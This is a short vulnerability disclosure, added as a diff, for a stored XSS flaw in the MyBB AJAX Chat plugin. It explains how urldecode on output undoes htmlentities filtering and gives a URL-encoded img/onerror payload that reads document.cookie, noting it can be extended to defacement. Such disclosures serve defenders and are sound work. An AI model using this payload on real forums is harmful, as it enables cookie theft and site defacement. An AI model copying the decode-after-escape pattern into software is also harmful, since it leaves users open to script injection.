@@ -1,0 +1,35 @@
+# Title: MyBB AJAX Chat Persistent XSS Vulnerability
+# Date: 12/12/2012
+# Exploit Author: Mr. P-teo
+# Vendor Homepage: http://www.mybb.com/
+# Software Link: http://mods.mybb.com/view/ajax-chat
+# Version: 1
+# Tested on: Windows
+
+The Persistent XSS vulnerability lies within the chat_frame.php page.
+
+*************************************** Persistent / Stored XSS **************************************
+
+
+Although the message is filter with the htmlentities function below.
+<?php
+
+	$db->insert_query($tbl, array('uid' => $mybb->user['uid'], 'message' => $db->escape_string(htmlentities($message)), 'date' => time()));
+
+?>
+
+The vulnerability occurs with the use of the urldecode function, allowing us to bypass the htmlentities with url encoding.
+<?php
+
+	$msg = urldecode($row["message"]);
+
+?>
+
+The vulnerability can be exploited via the following line, decoded as - "><img src="XSS" onerror="alert(document.cookie)" />
+
+%22%3E%3Cimg%20src%3D%22XSS%22%20onerror%3D%22alert(document.cookie)%22%20%2F%3E%0A
+
+This can be expanded on with defaces etc, alert is just a basic example.
+
+Brought to you be Mr. P-teo. 
+Twitter: http://twitter.com/MrPteo
